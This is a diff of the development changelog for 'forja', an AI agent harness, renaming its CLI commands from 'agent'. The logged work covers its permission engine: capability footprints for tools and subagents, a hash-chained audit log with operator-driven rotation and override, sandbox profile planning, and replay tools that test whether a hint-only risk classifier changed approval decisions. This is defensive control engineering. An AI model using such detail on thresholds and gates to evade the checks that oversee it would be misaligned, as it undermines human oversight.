-| `src/permissions/capabilities.ts` | New `TOOL_CAPABILITY_FOOTPRINTS` — per-policy-section map to `CapabilityKind[]`. `bash` is the full footprint (`exec`, `read-fs`, `write-fs`, `delete-fs`, `net-egress`, `git-write`); `read_file`/`glob`/`grep` are `read-fs` only; `write_file`/`edit_file` are `read-fs` + `write-fs`; `fetch_url` is `net-egress`. New `hasAllowRule(section)` helper covers all three policy shapes: `BashPolicy.allow`, `PathPolicy.allow_paths`, `FetchPolicy.allow_hosts`. New `universalScopeFor(kind)` returns `'arbitrary'` for `exec`, `'**'` for other scoped kinds, `null` for scope-less kinds (`env-mutate`, `agent-mutate`, `host-passthrough`). New `deriveParentCapabilities(policy): Capability[]` walks `policy.tools` sections that have a non-empty allow rule, expands each section to its footprint, and dedupes by kind (first wins). |
+| `src/permissions/capabilities.ts` | New `TOOL_CAPABILITY_FOOTPRINTS` — per-policy-section map to `CapabilityKind[]`. `bash` is the full footprint (`exec`, `read-fs`, `write-fs`, `delete-fs`, `net-egress`, `git-write`); `read_file`/`glob`/`grep` are `read-fs` only; `write_file`/`edit_file` are `read-fs` + `write-fs`; `fetch_url` is `net-egress`. New `hasAllowRule(section)` helper covers all three policy shapes: `BashPolicy.allow`, `PathPolicy.allow_paths`, `FetchPolicy.allow_hosts`. New `universalScopeFor(kind)` returns `'arbitrary'` for `exec`, `'**'` for other scoped kinds, `null` for scope-less kinds (`env-mutate`, `forja-mutate`, `host-passthrough`). New `deriveParentCapabilities(policy): Capability[]` walks `policy.tools` sections that have a non-empty allow rule, expands each section to its footprint, and dedupes by kind (first wins). |
 | `src/harness/loop.ts` | `spawnSubagentImpl` now auto-derives parent from `config.permissionEngine.policy()` when `declaredCapabilities` is set but `parentCapabilities` is not. Explicit `parentCapabilities` still wins (override path). Intersection runs as before — `effective` flows down to the child, `excess` is audited as the slice 22 contract requires. |
 | `tests/permissions/capabilities-intersection.test.ts` | 9 new tests under "deriveParentCapabilities — §10 policy-based parent set (slice 25)". Covers: empty tools section; bash w/ allow emits full footprint with `exec:arbitrary` (NOT `exec:**`); bash w/ only confirm/deny emits empty; per-section emission (`read_file` → read-fs only; `write_file`/`edit_file` → read-fs + write-fs; `fetch_url` → net-egress); empty allow array → no delegation; multi-section dedupe (each kind once); end-to-end with intersection (typical declared subagent caps survive). |
 
@@ -19960,7 +21264,7 @@ Successor slices:
 |---|---|
 | `src/permissions/audit.ts` | New `ChainBreakAcceptedRow` type + `listChainBreakAcceptedRows(db, installId)`. Filters `approvals_log` by `tool_name = 'permission-engine'` first (narrows the scan to a tiny set in production) then matches `reason_chain_json LIKE '%chain-break-accepted%'`. Returns `(seq, ts)` ordered by seq. The LIKE on JSON is acceptable here — the prefix tool_name filter bounds the scan, and the stage marker is a stable literal the engine writes verbatim. |
 | `src/permissions/index.ts` | Re-exports the new type + function. |
-| `src/cli/permission-verify.ts` | After verifyChain returns, looks up accepted breaks via the new repo function. Text output: when the chain is intact AND breaks exist, renders `⚠ N chain-break-accepted row(s) on this chain (seqs: ...)` + an SQL hint. JSON output: adds `accepted_breaks: [{ seq, ts }, ...]` to the result envelope. Deny path: replaced obsolete "not implemented in this slice" text with a real operator hint (run `agent --accept-broken-chain` to continue under the known break). |
+| `src/cli/permission-verify.ts` | After verifyChain returns, looks up accepted breaks via the new repo function. Text output: when the chain is intact AND breaks exist, renders `⚠ N chain-break-accepted row(s) on this chain (seqs: ...)` + an SQL hint. JSON output: adds `accepted_breaks: [{ seq, ts }, ...]` to the result envelope. Deny path: replaced obsolete "not implemented in this slice" text with a real operator hint (run `forja --accept-broken-chain` to continue under the known break). |
 | `tests/permissions/audit.test.ts` | 3 new tests — empty case, multi-row case ordered by seq, install_id scoping. |
 | `tests/cli/permission-verify.test.ts` | 4 new tests — banner renders on intact chain with accepted breaks, JSON includes `accepted_breaks` array, clean chain shows no banner, broken-chain help text updated (recommends the flag as a real option, no "not implemented in this slice"). |
 
@@ -19969,7 +21273,7 @@ Successor slices:
 - **Banner fires on intact AND broken chains.** An accepted break on a still-intact chain is the operator's prior signature — it stays informational on every `verify` call. On the broken-chain path the help text already directs operators at the flag; rendering the banner there too would be noise. So intact-only banner; broken path has its own help block.
 - **`tool_name='permission-engine'` prefix filter narrows the LIKE scan.** SQLite's `reason_chain_json LIKE '%chain-break-accepted%'` is O(n) over candidates; the tool_name filter keeps the candidate set tiny (engine-emitted rows are rare — one per acceptance event AND one per `chain-break-accepted` stage). In production the entire approvals_log scans tens-of-thousands of rows; the prefix filter trims to single digits.
 - **JSON adds the `accepted_breaks` field unconditionally.** Empty array when none — same shape every time. Consumers piping into `jq` don't have to branch on field presence. Cost: 17 bytes (`,"accepted_breaks":[]`) per call when empty.
-- **Deny-path help text drops the "not implemented in this slice" qualifier.** The flag IS implemented (since slice 8). The wording now points operators at the real flow: `agent --accept-broken-chain` re-runs with the override, an audit row lands BEFORE new decisions, and verify visibility (this slice) keeps the override permanent in the chain's forensic surface.
+- **Deny-path help text drops the "not implemented in this slice" qualifier.** The flag IS implemented (since slice 8). The wording now points operators at the real flow: `forja --accept-broken-chain` re-runs with the override, an audit row lands BEFORE new decisions, and verify visibility (this slice) keeps the override permanent in the chain's forensic surface.
 
 ### Verification
 
@@ -20046,7 +21350,7 @@ Successor slices:
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 22: `agent permission inspect <rotation_id>` (§7.2 quarantine clearance)
+## [2026-05-11] permission-engine-v2 — slice 22: `forja permission inspect <rotation_id>` (§7.2 quarantine clearance)
 
 **Done.** Twenty-second slice. Closes the rotate-chain loop opened by slice 8: an operator who has inspected an archived chain segment can now flip its `quarantined` flag via the CLI, instead of issuing direct SQL. Read-only by default — renders chain_meta + archived-row count; `--clear` performs the flip after the operator confirms.
 
@@ -20127,7 +21431,7 @@ Successor slices:
 3. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 4. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 5. `--accept-broken-chain` operator override (§7.2 second flag).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 7. ULID-shaped public approval ids.
 
 ---
@@ -20164,7 +21468,7 @@ Successor slices:
 3. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 4. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 5. `--accept-broken-chain` operator override (§7.2 second flag).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 7. ULID-shaped public approval ids.
 
 ---
@@ -20234,7 +21538,7 @@ Successor slices:
 4. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 5. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 6. `--accept-broken-chain` operator override (§7.2 second flag).
-7. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+7. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 8. ULID-shaped public approval ids.
 
 ---
@@ -20306,14 +21610,14 @@ Other pending slices:
 - Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 - Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 - `--accept-broken-chain` operator override (§7.2 second flag).
-- `agent permission inspect <rotation_id>` (clears the quarantine flag).
+- `forja permission inspect <rotation_id>` (clears the quarantine flag).
 - ULID-shaped public approval ids.
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 17: `agent permission diff <s1> <s2>` (§17 cross-row)
+## [2026-05-11] permission-engine-v2 — slice 17: `forja permission diff <s1> <s2>` (§17 cross-row)
 
-**Done.** Seventeenth slice of the v2 evolution. Closes §17 with the cross-row comparison verb: `agent permission diff <seq1> <seq2>` renders two audit rows side-by-side with field-by-field diff markers, capabilities set diff, and score-components deltas. Read-only — every input the analysis needs is already columns on the rows. No re-execution: §17's three replay modes (slice 12 default, slice 14 `--without-classifier`, slice 16 `--against-current-policy`) own the re-execution surface.
+**Done.** Seventeenth slice of the v2 evolution. Closes §17 with the cross-row comparison verb: `forja permission diff <seq1> <seq2>` renders two audit rows side-by-side with field-by-field diff markers, capabilities set diff, and score-components deltas. Read-only — every input the analysis needs is already columns on the rows. No re-execution: §17's three replay modes (slice 12 default, slice 14 `--without-classifier`, slice 16 `--against-current-policy`) own the re-execution surface.
 
 ### Use cases
 
@@ -20341,7 +21645,7 @@ Other pending slices:
 
 ### §17 closure
 
-The replay surface now matches the spec example output verbatim (`agent permission replay <id>`, `replay <id> --against-current-policy`, `replay <id> --without-classifier`, `diff <id1> <id2>`). The only piece of §17 still on the roadmap is ULID-shaped public ids (`ap_01H3K5...`) — current implementation uses `seq` (locally unique). That's a parallel-design task (column add + emit-path change + parser sync) and lands when external ULID referencing matters.
+The replay surface now matches the spec example output verbatim (`forja permission replay <id>`, `replay <id> --against-current-policy`, `replay <id> --without-classifier`, `diff <id1> <id2>`). The only piece of §17 still on the roadmap is ULID-shaped public ids (`ap_01H3K5...`) — current implementation uses `seq` (locally unique). That's a parallel-design task (column add + emit-path change + parser sync) and lands when external ULID referencing matters.
 
 ### Verification
 
@@ -20356,16 +21660,16 @@ Successor slices (still in spec order):
 2. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 3. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 4. `--accept-broken-chain` operator override (§7.2 second flag — surface exists; the runtime override flag needs its own slice).
-5. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+5. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 6. ULID-shaped public approval ids (parallel-design task; surface change spanning every replay/diff endpoint).
 
 ---
 
 ## [2026-05-11] permission-engine-v2 — slice 16: replay `--against-current-policy` (§17)
 
-**Done.** Sixteenth slice of the v2 evolution. Third of the three §17 replay modes lands: `agent permission replay <seq> --against-current-policy` re-executes the full decision pipeline against the ACTIVE policy using the row's raw args (recovered via slice 15's `approval_call_links` + `tool_calls.input`), and reports whether the active policy would gate the same call differently.
+**Done.** Sixteenth slice of the v2 evolution. Third of the three §17 replay modes lands: `forja permission replay <seq> --against-current-policy` re-executes the full decision pipeline against the ACTIVE policy using the row's raw args (recovered via slice 15's `approval_call_links` + `tool_calls.input`), and reports whether the active policy would gate the same call differently.
 
-The two prereqs are now both load-bearing: slice 13's `policy_archive` (untouched in this slice — future `permission diff` will consume it for two-row comparisons) and slice 15's `approval_call_links` (the live edge that lets replay recover the args raw). With this slice, every line from spec §17's example output is achievable except the cross-row `agent permission diff`, which is a structural variant of this same machinery.
+The two prereqs are now both load-bearing: slice 13's `policy_archive` (untouched in this slice — future `permission diff` will consume it for two-row comparisons) and slice 15's `approval_call_links` (the live edge that lets replay recover the args raw). With this slice, every line from spec §17's example output is achievable except the cross-row `forja permission diff`, which is a structural variant of this same machinery.
 
 ### What re-execution actually does
 
@@ -20413,12 +21717,12 @@ When any prereq is missing (link absent, `tool_calls` row GC'd by retention, `se
 ### Next
 
 Successor slices (still in spec order):
-1. `agent permission diff <id1> <id2>` — cross-row replay comparison. Consumes `policy_archive` (slice 13) for both rows' policy bytes + `approval_call_links` (slice 15) for both rows' args. Structurally similar to `--against-current-policy` but with two archived contexts instead of one archived + one live.
+1. `forja permission diff <id1> <id2>` — cross-row replay comparison. Consumes `policy_archive` (slice 13) for both rows' policy bytes + `approval_call_links` (slice 15) for both rows' args. Structurally similar to `--against-current-policy` but with two archived contexts instead of one archived + one live.
 2. Sandbox runner — synthesize bwrap argv from the chosen profile + wrap every tool spawn (§6.5 enforcement).
 3. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 4. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 5. `--accept-broken-chain` operator override (§7.2 second flag — surface exists; the runtime override flag needs its own slice).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
@@ -20464,18 +21768,18 @@ Successor slices (still in spec order):
 
 Successor slices (still in spec order):
 1. Replay `--against-current-policy` mode — re-execute the original pipeline against the active policy and surface the diff. Consumes `policy_archive` (slice 13) for the original policy bytes AND `approval_call_links` (slice 15) for the raw args. The two prerequisites are now in place.
-2. `agent permission diff <id1> <id2>` — cross-row comparison; same prerequisites as #1.
+2. `forja permission diff <id1> <id2>` — cross-row comparison; same prerequisites as #1.
 3. Sandbox runner — synthesize bwrap argv from the chosen profile + wrap every tool spawn (§6.5 enforcement).
 4. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 5. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 6. `--accept-broken-chain` operator override (§7.2 second flag).
-7. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+7. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
 ## [2026-05-11] permission-engine-v2 — slice 14: replay `--without-classifier` (§17)
 
-**Done.** Fourteenth slice of the v2 evolution. Lands the second of the three §17 replay modes: `agent permission replay <seq> --without-classifier` decomposes the row's score into deterministic (sum of feature components) + classifier adjust, re-applies the §6.6 threshold rule both ways, and reports whether the classifier moved the decision across the gate.
+**Done.** Fourteenth slice of the v2 evolution. Lands the second of the three §17 replay modes: `forja permission replay <seq> --without-classifier` decomposes the row's score into deterministic (sum of feature components) + classifier adjust, re-applies the §6.6 threshold rule both ways, and reports whether the classifier moved the decision across the gate.
 
 Pure analysis — no re-execution, no engine bootstrap, no policy load. The audit row already carries every input the analysis needs as separate columns (`score`, `score_components_json`, `classifier_adjust`).
 
@@ -20484,7 +21788,7 @@ Pure analysis — no re-execution, no engine bootstrap, no policy load. The audi
 The two deferred modes both require infrastructure this slice deliberately doesn't add:
 
 - `--against-current-policy` needs the ORIGINAL policy bytes (slice 13's `policy_archive` ✓) AND the raw tool args (no current path persists them past the session — `approvals_log` only has `args_hash`). Without args, the decision pipeline's resolver + static-rule branches can't run deterministically.
-- `agent permission diff <id1> <id2>` is structurally the same as `--against-current-policy` but with two archived rows on each side; same args prerequisite.
+- `forja permission diff <id1> <id2>` is structurally the same as `--against-current-policy` but with two archived rows on each side; same args prerequisite.
 
 `--without-classifier` answers a real operator question — "did the classifier's hint change the decision on this call?" — using only data already on the row. Spec §6.4 mandates the classifier as hint-only (clamped ±0.2); this mode makes that property auditable per-call.
 
@@ -20516,7 +21820,7 @@ The §6.6 row 5 rule ("confidence != high → confirm") is NOT modeled — it do
 - **Threshold sourced from the engine constant, not from the row.** `DEFAULT_SCORE_CONFIRM_THRESHOLD` is what the engine uses today. A future calibration sweep that re-derives the value will affect new rows; old rows replayed under the new threshold show the analysis "under TODAY's threshold". Documented so the operator isn't confused if a re-replay months later reports a different verdict from the original audit reasoning. The threshold is surfaced in the JSON output as `classifier_impact.threshold` for explicit grounding.
 - **Verdict captures the score-side gate ONLY.** The §6.6 approval-gate has two disjuncts: score ≥ threshold OR confidence != high. The score-side is what the classifier can move; the confidence-side is determined by the resolver upstream and the classifier can't affect it. Modeling both would require speculating about a counterfactual resolver state — out of scope. The mode is honest about its scope in the comment + JSON shape.
 - **JSON output ALWAYS includes the four numbers + booleans even when verdict is `not_run`.** Operators piping into jq for analysis want the deterministic_score (= final_score in this case) and threshold uniformly available; conditionally omitting them would force a `null`-check on every field.
-- **The flag rejects when combined with non-replay verbs.** Operator error visibility — `agent permission verify --without-classifier` is meaningless; surface that at parse instead of letting the flag drop silently into the unused-token bucket.
+- **The flag rejects when combined with non-replay verbs.** Operator error visibility — `forja permission verify --without-classifier` is meaningless; surface that at parse instead of letting the flag drop silently into the unused-token bucket.
 
 ### Verification
 
@@ -20529,12 +21833,12 @@ The §6.6 row 5 rule ("confidence != high → confirm") is NOT modeled — it do
 Successor slices (still in spec order):
 1. `tool_calls` linkage to `approvals_log` (FK or args-hash join) — prerequisite for re-execution modes.
 2. Replay `--against-current-policy` mode — consumes `policy_archive` + raw args from `tool_calls`.
-3. `agent permission diff <id1> <id2>` — consumes `policy_archive` for both ids.
+3. `forja permission diff <id1> <id2>` — consumes `policy_archive` for both ids.
 4. Sandbox runner — synthesize bwrap argv from the chosen profile + wrap every tool spawn (§6.5 enforcement).
 5. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 6. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 7. `--accept-broken-chain` operator override (§7.2 second flag — surface exists; the runtime override flag needs its own slice).
-8. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+8. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
@@ -20596,18 +21900,18 @@ Bootstrap stores `canonicalize(policy)` (the same bytes the engine hashes) and `
 Successor slices (still in spec order):
 1. Replay `--against-current-policy` mode — re-execute the original decision pipeline against the active policy and surface the diff. Consumes `policy_archive`.
 2. Replay `--without-classifier` mode — same as default but force the classifier branch off. Consumes `policy_archive`.
-3. `agent permission diff <id1> <id2>` — cross-row comparison. Consumes `policy_archive` for both ids.
+3. `forja permission diff <id1> <id2>` — cross-row comparison. Consumes `policy_archive` for both ids.
 4. Sandbox runner — synthesize bwrap argv from the chosen profile + wrap every tool spawn (§6.5 enforcement).
 5. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 6. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 7. `--accept-broken-chain` operator override (§7.2 second flag — surface exists; the runtime override flag needs its own slice).
-8. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+8. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
 ## [2026-05-11] permission-engine-v2 — slice 12: replay tool default mode (§17)
 
-**Done.** Twelfth slice of the v2 evolution. Lands `agent permission replay <seq>` — the spec §17 forensic surface for "qual decisão liberou X?". Slice 12 ships the **default mode only**: read the approvals_log row, render every preserved input, flag policy drift. The two extension modes (`--against-current-policy`, `--without-classifier`) and the cross-row `agent permission diff <id1> <id2>` are deferred — they all require a `policy_archive` table the slice deliberately doesn't add yet.
+**Done.** Twelfth slice of the v2 evolution. Lands `forja permission replay <seq>` — the spec §17 forensic surface for "qual decisão liberou X?". Slice 12 ships the **default mode only**: read the approvals_log row, render every preserved input, flag policy drift. The two extension modes (`--against-current-policy`, `--without-classifier`) and the cross-row `forja permission diff <id1> <id2>` are deferred — they all require a `policy_archive` table the slice deliberately doesn't add yet.
 
 ### Scope: render the past, don't re-execute it (yet)
 
@@ -20652,8 +21956,8 @@ Successor slices (still in spec order):
 3. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 4. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 5. `--accept-broken-chain` operator override (§7.2 second flag).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag).
-7. `agent permission diff <id1> <id2>` (§17 cross-row comparison; pairs with #1).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag).
+7. `forja permission diff <id1> <id2>` (§17 cross-row comparison; pairs with #1).
 
 ---
 
@@ -20707,12 +22011,12 @@ Even though slice 3 already canonicalizes capability scopes, this slice drops th
 ### Next
 
 Successor slices (still in spec order):
-1. Replay tool (`agent permission replay`).
+1. Replay tool (`forja permission replay`).
 2. Sandbox runner — synthesize bwrap argv from the chosen profile + wrap every tool spawn (§6.5 enforcement).
 3. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 automation).
 4. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 5. `--accept-broken-chain` operator override (§7.2 second flag).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
@@ -20732,7 +22036,7 @@ This slice ships the PLAN (which profile + audit + state transitions). The actua
 
 ### Coverage table (`PROFILE_ALLOWED_CAPABILITIES`)
 
-| Profile | read-fs | write-fs | delete-fs | exec | git-write | net-egress | net-ingress | secret-access | env-mutate | agent-mutate | host-passthrough |
+| Profile | read-fs | write-fs | delete-fs | exec | git-write | net-egress | net-ingress | secret-access | env-mutate | forja-mutate | host-passthrough |
 |---|---|---|---|---|---|---|---|---|---|---|---|
 | `ro` | ✓ | | | ✓ | | | | | | | |
 | `cwd-rw` | ✓ | ✓ | ✓ | ✓ | ✓ | | | | | | |
@@ -20742,8 +22046,8 @@ This slice ships the PLAN (which profile + audit + state transitions). The actua
 
 Notes:
 - All profiles allow `read-fs` + `exec` (sandbox doesn't take exec away, it scopes the process the exec produces).
-- `secret-access` requires `home-rw` or `host` — secrets live under `$HOME` (`~/.config/agent/secrets`), maps onto spec's "secret paths hidden EXCEPT if capability authorized".
-- `env-mutate` + `agent-mutate` + `host-passthrough` are host-only — they mutate state the parent process cares about.
+- `secret-access` requires `home-rw` or `host` — secrets live under `$HOME` (`~/.config/forja/secrets`), maps onto spec's "secret paths hidden EXCEPT if capability authorized".
+- `env-mutate` + `forja-mutate` + `host-passthrough` are host-only — they mutate state the parent process cares about.
 
 ### Surface
 
@@ -20765,7 +22069,7 @@ Notes:
 ### Decisions
 
 - **Planning only, enforcement deferred.** The slice's contract is "the audit row says which profile WOULD apply." Real sandboxing of tool processes is a separate concern wired into the tool dispatcher — the planner gives that future slice everything it needs. Audit consumers (replay, postmortem) work today against the populated column.
-- **`secret-access` requires `home-rw` or `host`.** Spec §6.5 says home-rw hides secrets "EXCEPT if capability autorizou"; modeled here as `home-rw.allowed_capabilities` including `secret-access`. The two cwd-rw profiles do NOT — secrets live above cwd. Operationally aligns with `~/.config/agent/secrets` placement.
+- **`secret-access` requires `home-rw` or `host`.** Spec §6.5 says home-rw hides secrets "EXCEPT if capability autorizou"; modeled here as `home-rw.allowed_capabilities` including `secret-access`. The two cwd-rw profiles do NOT — secrets live above cwd. Operationally aligns with `~/.config/forja/secrets` placement.
 - **Host gates are AND, not OR.** Spec literal: "host exige flag explícito do user **e** capability `host-passthrough` allowed em policy. Sem ambos → deny". Implemented at the planner layer (prune host from candidates if either gate fails) — defense in depth: even if policy mistakenly grants host-passthrough, the absence of the CLI flag stops accidental passthrough.
 - **Bootstrap owns the unavailable transition.** Per-call `check()` doesn't second-guess availability; if the engine reached `ready`, the runner side (later slice) deals with bwrap-not-on-PATH at exec time. This keeps `check()` deterministic and the state-machine the single arbiter of "is this engine even usable".
 - **`refusingReason` only populated for required+unavailable.** Other refusing transitions (chain break, policy invalid) own their own reason strings; sandbox layers on without overwriting them. The `BootstrapPermissionEngineResult.state` change from hardcoded `'ready'` to `controller.get()` lets every future bootstrap-time transition flow through automatically.
@@ -20780,12 +22084,12 @@ Notes:
 
 Successor slices (still in spec order):
 1. Context-summary builder for the classifier input.
-2. Replay tool (`agent permission replay`).
+2. Replay tool (`forja permission replay`).
 3. Sandbox runner — synthesize bwrap argv from the chosen profile + wrap every tool spawn (the §6.5 enforcement side).
 4. Auto-derive `parentCapabilities` from policy snapshot at spawn time (§10 wire-up automation).
 5. Policy section: `sandbox.required: true` + `sandbox.host-allowed: bool` (today operator-flag only).
 6. `--accept-broken-chain` operator override (§7.2 second flag).
-7. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+7. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
@@ -20807,7 +22111,7 @@ Slice 9 lands the third reading as the primitive plus opt-in plumbing. The harne
 | Parent shape | Covers | Notes |
 |---|---|---|
 | Different `kind` | Never | `read-fs` doesn't cover `write-fs`. |
-| Scope-less kind (`env-mutate`, `agent-mutate`, `host-passthrough`) | Identity | Kind alone is the capability. |
+| Scope-less kind (`env-mutate`, `forja-mutate`, `host-passthrough`) | Identity | Kind alone is the capability. |
 | `exec:arbitrary` | Every other exec class | The umbrella class. |
 | `exec:<class>` (non-arbitrary) | Same class only | `exec:shell` does NOT cover `exec:python`. |
 | `<kind>:**` or `<kind>:*` | Any scope of that kind | Universal wildcards. |
@@ -20854,20 +22158,20 @@ Anything not in the table refuses. This is **conservative**: a more permissive m
 Successor slices (still in spec order):
 1. Sandbox plan integration (bwrap profile selection, §6.5).
 2. Context-summary builder for the classifier input.
-3. Replay tool (`agent permission replay`).
+3. Replay tool (`forja permission replay`).
 4. Auto-derive `parentCapabilities` from policy snapshot at spawn time — completes the §10 wiring so the guard becomes the default rather than opt-in.
 5. `--accept-broken-chain` operator override (§7.2 second flag).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag).
 
 ---
 
 ## [2026-05-10] permission-engine-v2 — slice 8: --rotate-chain flow + quarantine state (§7.2)
 
-**Done.** Eighth slice of the v2 evolution. Implements the operator-driven chain rotation flow specified in `PERMISSION_ENGINE.md §7.2`: when the audit hash chain is broken (or preventively, after an incident scare), the operator runs `agent permission rotate-chain --reason "<text>"` to archive the current `approvals_log` segment under a new `rotation_id`, start a fresh chain from a distinct `GENESIS-ROTATED:<hash>`, and surface a `quarantined` flag in `agent permission verify` until the archived segment is inspected.
+**Done.** Eighth slice of the v2 evolution. Implements the operator-driven chain rotation flow specified in `PERMISSION_ENGINE.md §7.2`: when the audit hash chain is broken (or preventively, after an incident scare), the operator runs `forja permission rotate-chain --reason "<text>"` to archive the current `approvals_log` segment under a new `rotation_id`, start a fresh chain from a distinct `GENESIS-ROTATED:<hash>`, and surface a `quarantined` flag in `forja permission verify` until the archived segment is inspected.
 
 ### Why now
 
-Until this slice, the only `agent permission` verb was `verify`, which exits 1 when the chain is broken and surfaces a help text mentioning `--accept-broken-chain` (not implemented) and `--rotate-chain` (not implemented). The engine's state-machine `refusing` branch was load-bearing for slice 2 + 6 wiring but had no operator-recoverable path — every chain break required restoring from backup or wiping the DB. Slice 8 closes that gap with the spec's documented escape hatch.
+Until this slice, the only `forja permission` verb was `verify`, which exits 1 when the chain is broken and surfaces a help text mentioning `--accept-broken-chain` (not implemented) and `--rotate-chain` (not implemented). The engine's state-machine `refusing` branch was load-bearing for slice 2 + 6 wiring but had no operator-recoverable path — every chain break required restoring from backup or wiping the DB. Slice 8 closes that gap with the spec's documented escape hatch.
 
 The flow is operator-driven by design (spec §7.2 "Não-recuperável sem ação humana"). The engine never auto-rotates; calling code never bypasses; the only entry is the CLI subcommand with a mandatory `--reason` for forensic audit.
 
@@ -20885,7 +22189,7 @@ The flow is operator-driven by design (spec §7.2 "Não-recuperável sem ação 
 |---|---|
 | `src/storage/migrations/035-chain-rotation.ts` (new) | `approvals_log_archived` table mirrors `approvals_log` shape + `archive_rotation_id`, `archived_at_ms` (composite PK `(install_id, archive_rotation_id, seq)`); `chain_meta` table holds rotation events (`rotation_id` autoincrement PK, `install_id`, `rotated_at_ms`, `reason`, `pre_rotation_tip_hash`, `pre_rotation_seq_max`, `quarantined`). Indexes on archived `(install_id, archive_rotation_id)` and meta `(install_id, rotation_id DESC)` keep lookups O(log n). |
 | `src/storage/repos/chain-rotation.ts` (new) | `rotateChain(db, input)`: atomic `withTransaction` wrap. Insert chain_meta first (so AUTOINCREMENT assigns `rotation_id` before the COPY tags rows), then INSERT…SELECT into archive table, then DELETE from `approvals_log`. Returns `{ rotation_id, archived_rows, pre_rotation_tip_hash, pre_rotation_seq_max, rotated_at_ms }`. Read-side: `getLatestChainMeta`, `listChainMetaByInstall`, `listArchivedByRotation`, `clearQuarantine`. Empty-chain rotation supported (preventive rotation case). |
-| `src/permissions/audit.ts` | New `computeRotatedGenesisHash(identity, rotation_id, rotated_at_ms)` exported with `GENESIS-ROTATED:` prefix. `createSqliteSink` reads the latest `chain_meta` on construction; uses the rotated genesis when one exists, the original `GENESIS:` form otherwise. `verifyChain` re-reads meta on each call (covers the rare case where rotation lands between sink construction and a later verify invocation via `agent permission verify`'s independently-constructed sink). `VerifyResult` widened with `current_rotation_id: number` + `quarantined: boolean` for both ok and ng branches. |
+| `src/permissions/audit.ts` | New `computeRotatedGenesisHash(identity, rotation_id, rotated_at_ms)` exported with `GENESIS-ROTATED:` prefix. `createSqliteSink` reads the latest `chain_meta` on construction; uses the rotated genesis when one exists, the original `GENESIS:` form otherwise. `verifyChain` re-reads meta on each call (covers the rare case where rotation lands between sink construction and a later verify invocation via `forja permission verify`'s independently-constructed sink). `VerifyResult` widened with `current_rotation_id: number` + `quarantined: boolean` for both ok and ng branches. |
 | `src/cli/chain-rotate.ts` (new) | `runChainRotate(options)` orchestrates the rotation: install_id resolution, DB open + migrate, defensive `--reason` re-validation, atomic rotation call, JSON or text output. Mirrors `permission-verify.ts` structure (DB-only, no provider, no session). Exits 0 on success, 1 on bootstrap / rotation errors. |
 | `src/cli/args.ts` | Permission-subcommand parser extended: `rotate-chain` joins `verify` as a known verb. New `--reason <text>` flag captured into `permission.reason`; rejected when missing, empty, whitespace-only, or followed by another `--<flag>`. The unknown-verb error message and usage banner now list both verbs. |
 | `src/cli/run.ts` | Dispatch branch for the new verb wires `args.permission.reason` (parse-enforced) into `runChainRotate`. |
@@ -20898,10 +22202,10 @@ The flow is operator-driven by design (spec §7.2 "Não-recuperável sem ação 
 ### Decisions
 
 - **Reason is mandatory at parse time.** Optional with a "unspecified" default would let drift accumulate (every rotation looks the same in audit). Spec doesn't dictate, but operator hygiene does. The parser rejects; `runChainRotate` re-validates defensively for programmatic callers.
-- **Quarantine surfaces only in verify, doesn't degrade.** Spec §7.2 calls it "quarantine flag em queries até inspeção" — query-level, not engine-level. Engine boots normally on the rotated chain; the operator sees the banner the next time they run `verify`. A future slice can add `agent permission inspect <rotation_id>` to clear the flag interactively; for now the SQL is documented in the verify output.
